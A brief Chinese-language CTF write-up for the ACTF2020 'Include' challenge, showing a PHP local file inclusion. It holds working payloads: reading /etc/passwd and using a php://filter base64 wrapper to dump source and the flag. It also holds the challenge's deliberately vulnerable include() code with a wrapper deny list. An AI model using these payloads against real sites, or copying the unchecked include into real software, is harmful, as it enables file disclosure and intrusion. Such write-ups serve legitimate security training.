# [ACTF2020 新生赛]Include

打开链接发现tips url：`/?file=flag.php`

根据题目标题和hint猜测这应该是一道文件包含题。

尝试`/?file=/etc/passwd`包含成功！

尝试使用php read filter 读取index.php源码
`/?file=php://filter/read=convert.base64-encode/resource=index.php`
```php
<?php
error_reporting(0);
$file = $_GET["file"];
if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
	exit('hacker!');
}
if($file){
	include($file);
}else{
	echo '<a href="?file=flag.php">tips</a>';
}
?>
```

读取flag.php得到flag
`/?file=php://filter/read=convert.base64-encode/resource=flag.php`
